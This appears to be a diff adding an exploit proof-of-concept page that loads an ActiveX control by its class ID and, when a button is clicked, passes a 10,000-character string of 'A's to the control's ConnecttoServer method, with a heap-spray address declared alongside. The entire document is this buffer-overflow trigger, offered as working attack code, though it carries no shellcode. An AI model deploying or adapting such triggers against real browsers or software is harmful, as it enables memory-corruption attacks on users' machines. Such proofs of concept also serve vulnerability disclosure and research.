@@ -1,0 +1,20 @@
+<html>
+<head>
+<OBJECT ID="com" CLASSID="CLSID:{2EA6D939-4445-43F1-A12B-8CB3DDA8B855}">
+</OBJECT>
+</head>
+<body>
+<SCRIPT language="javascript">
+
+function ClickForRunCalc()
+{
+    var heapSprayToAddress = 0x0d0d0d0d;
+
+    var payLoadCode = "A" ;
+    while (payLoadCode.length <= 10000) payLoadCode+='A';
+    com.ConnecttoServer("1",payLoadCode,"3","4","5");
+}
+</script>
+<button onclick="javascript:ClickForRunCalc();">ClickForRunCalc</button>
+</body>
+</html>
